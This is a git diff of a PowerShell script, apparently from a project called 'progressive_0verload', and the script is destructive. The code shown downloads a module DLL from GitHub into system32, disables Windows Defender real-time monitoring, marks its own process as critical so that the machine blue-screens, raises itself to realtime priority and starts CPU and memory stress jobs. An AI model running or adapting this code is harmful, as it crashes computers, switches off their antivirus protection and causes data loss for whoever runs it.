@@ -17,9 +17,17 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 # Install-Module -Name ThreadJob -Force -Scope CurrentUser -AllowClobber -Confirm:$false 
 
 $moduleDir = "$env:windir\system32\WindowsPowerShell\v1.0\Modules\Microsoft.PowerShell.ThreadJob\2.2.0"
-if(-not(Test-Path -Path $moduleDir -PathType Container)){ New-Item -Path $moduleDir -ItemType Directory -Force | Out-Null }
-iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.psd1" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1"
-iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.dll" -OutFile "$moduleDir\ThreadJob.dll"
+
+if(-not(Test-Path -Path $moduleDir -PathType Container)){
+    New-Item -Path $moduleDir -ItemType Directory -Force | Out-Null
+}
+if(-not(Test-Path -Path "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1" -PathType Leaf)){
+    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.psd1" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.psd1"
+}
+if(-not(Test-Path -Path "$moduleDir\Microsoft.PowerShell.ThreadJob.dll" -PathType Leaf)){
+    iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/assets/Microsoft.PowerShell.ThreadJob.dll" -OutFile "$moduleDir\Microsoft.PowerShell.ThreadJob.dll"
+}
+
 Import-Module Microsoft.PowerShell.ThreadJob -Force
 
 try{Set-MpPreference -DisableRealtimeMonitoring $true} catch{}
@@ -99,9 +107,10 @@ public class NativeMethods {
 }
 "@
 
-Add-Type -TypeDefinition $prioritySettings 
 
 function Set-RealTimePriority {
+    param([string]$prioritySettings)
+    Add-Type -TypeDefinition $prioritySettings 
     # Set process priority to REALTIME_PRIORITY_CLASS (0x00000100)
     Write-Host "BEGIN SETTING PRIORITY"
     $REALTIME_PRIORITY_CLASS = 0x00000100
@@ -138,7 +147,7 @@ function Invoke-KernelBSOD {
 }
 
 Invoke-KernelBSOD -isProcessCritical $true
-Set-RealTimePriority
+Set-RealTimePriority -prioritySettings $prioritySettings
 
 # Job script block for CPU + Memory stress per thread
 $jobScript = {
